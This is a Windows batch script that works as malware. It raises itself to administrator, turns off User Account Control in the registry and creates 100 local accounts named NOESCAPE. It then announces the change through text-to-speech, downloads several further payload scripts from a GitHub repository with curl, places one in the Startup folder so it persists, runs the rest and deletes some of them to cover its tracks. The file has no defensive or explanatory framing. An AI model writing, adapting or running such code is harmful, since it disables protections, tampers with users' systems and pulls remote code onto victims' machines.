@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
Set /a loop = 0

:loopstart
ping 127.0.0.1 -n 1 -w 25 >nul
net user NOESCAPE%loop% /add

ping 127.0.0.1 -n 1 -w 25 >nul
goto check

:check
if %loop% == 100 goto done
echo %loop%
Set /a loop += 1
goto loopstart

:done
PowerShell -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.SelectVoice('Microsoft David Desktop'); $speak.Speak('hello user we have just added 100 accounts to your pc')"
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk.vbs
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk1.vbs
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/fileadder.bat
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Screenshot.ps1
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Payload.bat
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/soundplayer.bat
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/start.bat
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2.vbs
@echo off
copy "./talk2.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start talk.vbs
start fileadder.bat
timeout 3 > nul
del /f /q "talk.vbs"
del /f /q "fileadder.bat"
del /f /q "Screenshot.ps1"
start talk1.vbs
timeout 6 > nul
del /f /q "talk1.vbs"
start Payload.bat

